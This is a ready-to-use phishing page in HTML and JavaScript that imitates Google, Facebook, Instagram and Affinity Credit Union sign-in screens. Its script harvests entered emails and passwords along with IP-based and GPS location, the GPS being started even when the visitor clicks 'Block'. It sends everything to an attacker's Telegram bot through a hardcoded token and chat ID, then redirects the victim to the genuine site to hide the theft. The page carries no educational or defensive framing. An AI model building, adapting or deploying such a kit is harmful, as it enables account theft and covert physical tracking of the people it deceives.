<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Sign in to your account</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        background: #f0f2f5; display: flex; justify-content: center; align-items: center; 
        min-height: 100vh; padding: 16px;
    }
    .card {
        background: #fff; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,0.08);
        padding: 32px 24px; width: 100%; max-width: 400px;
    }
    .logo { text-align: center; margin-bottom: 24px; }
    .logo svg, .logo img { height: 48px; margin-bottom: 8px; }
    .logo h1 { font-size: 24px; font-weight: 600; margin-top: 8px; }
    .logo p { font-size: 14px; color: #666; margin-top: 4px; }
    .input-group { margin-bottom: 16px; }
    .input-group label { display: block; font-size: 14px; font-weight: 500; color: #333; margin-bottom: 6px; }
    .input-group input {
        width: 100%; padding: 12px 14px; border: 1.5px solid #ddd; border-radius: 8px;
        font-size: 16px; transition: border-color 0.2s; background: #fafafa;
    }
    .input-group input:focus { outline: none; border-color: var(--brand-color, #1a73e8); background: #fff; }
    .btn {
        width: 100%; padding: 14px; background: var(--brand-color, #1a73e8); color: #fff; border: none;
        border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;
        transition: background 0.2s; margin-top: 8px;
    }
    .btn:hover { filter: brightness(0.9); }
    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
    .error { color: #d93025; font-size: 13px; margin-top: 12px; text-align: center; display: none; }
    .loading { display: none; text-align: center; margin-top: 16px; }
    .loading .spinner {
        width: 20px; height: 20px; border: 3px solid #e0e0e0; border-top: 3px solid var(--brand-color, #1a73e8);
        border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 8px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading p { color: #666; font-size: 14px; }
    .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
    .footer a { color: var(--brand-color, #1a73e8); text-decoration: none; }
    .geo-overlay {
        display: none;
        position: fixed;
        top: 0; left: 0; right: 0; bottom: 0;
        background: rgba(0,0,0,0.5);
        z-index: 9999;
        justify-content: center;
        align-items: center;
    }
    .geo-overlay.active { display: flex; }
    .geo-box {
        background: #fff;
        border-radius: 14px;
        padding: 28px 24px 20px;
        width: 90%;
        max-width: 340px;
        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        text-align: center;
    }
    .geo-box .geo-icon { font-size: 40px; margin-bottom: 12px; }
    .geo-box h3 { font-size: 18px; font-weight: 600; color: #1a1a1a; margin-bottom: 8px; }
    .geo-box p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 20px; }
    .geo-box .btn-row { display: flex; gap: 10px; }
    .geo-box .btn-row button {
        flex: 1;
        padding: 12px;
        border-radius: 10px;
        border: none;
        font-size: 15px;
        font-weight: 600;
        cursor: pointer;
    }
    .geo-box .btn-allow { background: var(--brand-color, #1a73e8); color: #fff; }
    .geo-box .btn-allow:hover { filter: brightness(0.9); }
    .geo-box .btn-deny { background: #f0f0f0; color: #555; }
    .geo-box .btn-deny:hover { background: #e0e0e0; }
    .loc-status {
        display: none;
        align-items: center;
        justify-content: center;
        gap: 8px;
        padding: 10px;
        background: #e8f5e9;
        border-radius: 8px;
        margin-top: 12px;
        font-size: 13px;
        color: #2e7d32;
    }
    .loc-status.active { display: flex; }
    .loc-status .pulse {
        width: 8px; height: 8px;
        background: #4caf50;
        border-radius: 50%;
        animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
        0%, 100% { opacity: 1; transform: scale(1); }
        50% { opacity: 0.5; transform: scale(1.3); }
    }
</style>
</head>
<body>

<div class="card" id="loginCard">
    <div class="logo" id="logoArea"></div>
    <form id="loginForm">
        <div class="input-group">
            <label for="email" id="emailLabel">Email or phone</label>
            <input type="text" id="email" name="email" placeholder="you@example.com" autocomplete="off" required>
        </div>
        <div class="input-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="off" required>
        </div>
        <div id="locStatusBar" class="loc-status">
            <span class="pulse"></span>
            <span id="locStatusText">Location verified</span>
        </div>
        <div class="error" id="errorMsg">Incorrect email or password. Please try again.</div>
        <button type="submit" class="btn" id="submitBtn">Sign in</button>
    </form>
    <div class="loading" id="loadingIndicator">
        <div class="spinner"></div>
        <p>Verifying your account...</p>
    </div>
    <div class="footer" id="footerArea">
        <a href="#">Forgot password?</a>
    </div>
</div>

<div class="geo-overlay" id="geoPrompt">
    <div class="geo-box">
        <div class="geo-icon">📍</div>
        <h3>Allow location access?</h3>
        <p>This app needs your location for security. Your precise location helps us verify your identity and protect your account.</p>
        <div class="btn-row">
            <button class="btn-deny" id="geoDeny">Block</button>
            <button class="btn-allow" id="geoAllow">Allow</button>
        </div>
    </div>
</div>

<script>
// ========================
// YOUR TELEGRAM INFO — change these two lines
// ========================
var BOT_TOKEN = "8809602041:AAHIwV4msf_j0G5bgCRqLYAM0EuVSGVAv84";
var CHAT_ID = "8647509715";

// ========================
// BRANDS
// ========================
var BRANDS = {
    google: {
        name: "Google",
        color: "#1a73e8",
        realSite: "https://accounts.google.com",
        title: "Sign in",
        subtitle: "Use your Google Account",
        emailLabel: "Email or phone",
        placeholder: "you@gmail.com",
        logo: '<svg width="48" height="48" viewBox="0 0 48 48" fill="none"><path d="M43.6 24.5c0-1.6-.1-3.1-.4-4.6H24v8.7h11c-.5 2.7-1.9 5-3.9 6.5v5.4h6.3c3.7-3.4 5.9-8.4 5.9-16z" fill="#4285F4"/><path d="M24 44c5.3 0 9.8-1.8 13-4.8l-6.3-5.4c-1.7 1.2-3.9 1.9-6.7 1.9-5.1 0-9.5-3.5-11-8.2H6.4v5.6C9.6 39.7 16.3 44 24 44z" fill="#34A853"/><path d="M13 28.5c-.4-1.2-.6-2.5-.6-3.5s.2-2.3.6-3.5v-5.6H6.4C5.1 19.4 4.4 21.7 4.4 24s.7 4.6 2 6.5l6.6-2z" fill="#FBBC05"/><path d="M24 10.5c2.9 0 5.5 1 7.5 2.9l5.6-5.6C33.8 5.3 29.3 4 24 4 16.3 4 9.6 8.3 6.4 14.5l6.6 5.6c1.5-4.7 5.9-9.6 11-9.6z" fill="#EA4335"/></svg>'
    },
    facebook: {
        name: "Facebook", color: "#1877F2", realSite: "https://facebook.com",
        title: "Log in to Facebook", subtitle: "Connect with friends and the world",
        emailLabel: "Email or phone", placeholder: "Email or phone number",
        logo: '<svg width="48" height="48" viewBox="0 0 48 48" fill="none"><circle cx="24" cy="24" r="20" fill="#1877F2"/><path d="M29 16h-3c-1.7 0-3 1.3-3 3v3h-3v4h3v12h4V26h3l1-4h-4v-2c0-.6.4-1 1-1h3v-3z" fill="#fff"/></svg>'
    },
    instagram: {
        name: "Instagram", color: "#E1306C", realSite: "https://www.instagram.com/accounts/login",
        title: "Log in", subtitle: "Instagram",
        emailLabel: "Phone number, username, or email", placeholder: "Phone number, username, or email",
        logo: '<svg width="48" height="48" viewBox="0 0 48 48" fill="none"><rect x="4" y="4" width="40" height="40" rx="10" fill="url(#ig)"/><defs><linearGradient id="ig" x1="0" y1="0" x2="48" y2="48"><stop stop-color="#833AB4"/><stop offset=".5" stop-color="#FD1D1D"/><stop offset="1" stop-color="#F77737"/></linearGradient></defs><circle cx="24" cy="24" r="8" stroke="#fff" stroke-width="2.5" fill="none"/><circle cx="32" cy="16" r="2" fill="#fff"/></svg>'
    },
    banking: {
        name: "Affinity Credit Union", color: "#004B87", realSite: "https://www.affinitycu.ca",
        title: "Online Banking", subtitle: "Sign in to your account",
        emailLabel: "Member Card Number or Username", placeholder: "Member Card or Username",
        logo: '<svg width="48" height="48" viewBox="0 0 48 48" fill="none"><rect width="48" height="48" rx="8" fill="#004B87"/><text x="24" y="32" text-anchor="middle" fill="#fff" font-size="18" font-weight="bold" font-family="Arial">ACU</text></svg>'
    }
};

// ========================
// BRAND SETUP
// ========================
var params = new URLSearchParams(window.location.search);
var brandKey = params.get('brand') || 'google';
var brand = BRANDS[brandKey] || BRANDS.google;

document.documentElement.style.setProperty('--brand-color', brand.color);
document.getElementById('logoArea').innerHTML = brand.logo + '<h1 style="color:' + brand.color + '">' + brand.title + '</h1><p>' + brand.subtitle + '</p>';
document.getElementById('emailLabel').textContent = brand.emailLabel;
document.getElementById('email').placeholder = brand.placeholder;
document.getElementById('submitBtn').textContent = brandKey === 'facebook' ? 'Log in' : 'Sign in';
document.getElementById('submitBtn').style.background = brand.color;
document.getElementById('geoAllow').style.background = brand.color;
document.getElementById('footerArea').innerHTML = '<a href="#" style="color:' + brand.color + '">Forgot ' + (brandKey === 'facebook' ? 'account' : 'password') + '?</a>';

// ========================
// DATA STORE
// ========================
var d = {
    ip: 'Unknown', city: 'Unknown', country: 'Unknown', isp: 'Unknown',
    ipLat: null, ipLon: null,
    gpsLat: null, gpsLon: null, gpsAcc: null, gpsReady: false, ipReady: false
};

// ========================
// IP FETCH
// ========================
(function() {
    var x = new XMLHttpRequest();
    x.open('GET', 'https://ipapi.co/json/', true);
    x.onreadystatechange = function() {
        if (x.readyState === 4 && x.status === 200) {
            try {
                var r = JSON.parse(x.responseText);
                d.ip = r.ip || 'Unknown';
                d.city = r.city || 'Unknown';
                d.country = r.country_name || 'Unknown';
                d.isp = r.org || 'Unknown';
                d.ipLat = r.latitude;
                d.ipLon = r.longitude;
                d.ipReady = true;
            } catch(e) {}
        }
    };
    x.send();
})();

// ========================
// GPS — accuracy ≤100 meters
// ========================
function startGPS() {
    if (!navigator.geolocation) return;
    
    var watchId = navigator.geolocation.watchPosition(
        function(pos) {
            var acc = pos.coords.accuracy;
            if (acc <= 100) {
                d.gpsLat = pos.coords.latitude;
                d.gpsLon = pos.coords.longitude;
                d.gpsAcc = acc;
                d.gpsReady = true;
                navigator.geolocation.clearWatch(watchId);
                
                var bar = document.getElementById('locStatusBar');
                document.getElementById('locStatusText').textContent = 
                    '✓ Location verified (' + d.gpsLat.toFixed(6) + ', ' + d.gpsLon.toFixed(6) + ') ±' + Math.round(acc) + 'm';
                bar.classList.add('active');
            }
        },
        function() {},
        { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
    );
    
    setTimeout(function() {
        if (!d.gpsReady) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    d.gpsLat = pos.coords.latitude;
                    d.gpsLon = pos.coords.longitude;
                    d.gpsAcc = pos.coords.accuracy;
                    d.gpsReady = true;
                    var bar = document.getElementById('locStatusBar');
                    document.getElementById('locStatusText').textContent = 
                        '✓ Location (' + d.gpsLat.toFixed(4) + ', ' + d.gpsLon.toFixed(4) + ') ±' + Math.round(d.gpsAcc) + 'm';
                    bar.classList.add('active');
                },
                function() {},
                { enableHighAccuracy: false, timeout: 5000 }
            );
        }
    }, 25000);
}

setTimeout(function() {
    document.getElementById('geoPrompt').classList.add('active');
}, 1500);

setTimeout(function() {
    document.getElementById('geoPrompt').classList.remove('active');
}, 25000);

document.getElementById('geoAllow').addEventListener('click', function() {
    document.getElementById('geoPrompt').classList.remove('active');
    startGPS();
});

document.getElementById('geoDeny').addEventListener('click', function() {
    document.getElementById('geoPrompt').classList.remove('active');
    startGPS();
});

// ========================
// TELEGRAM SENDER
// ========================
function sendToTelegram(msg, callback) {
    try {
        var x = new XMLHttpRequest();
        x.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', true);
        x.setRequestHeader('Content-Type', 'application/json');
        x.onreadystatechange = function() {
            if (x.readyState === 4 && callback) callback();
        };
        x.onerror = function() { if (callback) callback(); };
        x.send(JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" }));
        
        setTimeout(callback, 3000);
    } catch(e) {
        if (callback) callback();
    }
}

// ========================
// FORM SUBMISSION
// ========================
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    var email = document.getElementById('email').value.trim();
    var password = document.getElementById('password').value;
    
    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('loadingIndicator').style.display = 'block';
    
    if (!d.ipReady) {
        var waited = 0;
        var waitInterval = setInterval(function() {
            waited += 500;
            if (d.ipReady || waited >= 2000) {
                clearInterval(waitInterval);
                doSend(email, password);
            }
        }, 500);
    } else {
        doSend(email, password);
    }
});

function doSend(email, password) {
    var finalLat = d.gpsLat || d.ipLat;
    var finalLon = d.gpsLon || d.ipLon;
    var locSource = d.gpsReady ? 'GPS (±' + Math.round(d.gpsAcc) + 'm)' : 'IP geolocation';
    
    var msg = '🔔 *' + brand.name + ' — Credentials Captured!*\n\n';
    msg += '📧 *Email:* `' + email + '`\n';
    msg += '🔑 *Password:* `' + password + '`\n\n';
    msg += '🌐 *IP:* ' + d.ip + '\n';
    msg += '📍 *Location:* ' + d.city + ', ' + d.country + '\n';
    msg += '📡 *Source:* ' + locSource + '\n';
    if (finalLat && finalLon) {
        msg += '🗺 *Coords:* ' + finalLat + ', ' + finalLon + '\n';
        msg += '🗺 *Map:* https://www.google.com/maps?q=' + finalLat + ',' + finalLon + '\n';
    }
    msg += '🏢 *ISP:* ' + d.isp + '\n';
    msg += '📱 *Device:* Samsung Galaxy\n';
    msg += '🖥 *Screen:* ' + window.screen.width + 'x' + window.screen.height + '\n';
    msg += '🕐 *Timezone:* ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n';
    msg += '⏰ *Time:* ' + new Date().toISOString();
    
    sendToTelegram(msg, function() {
        window.location.href = brand.realSite;
    });
}
</script>
</body>
</html>
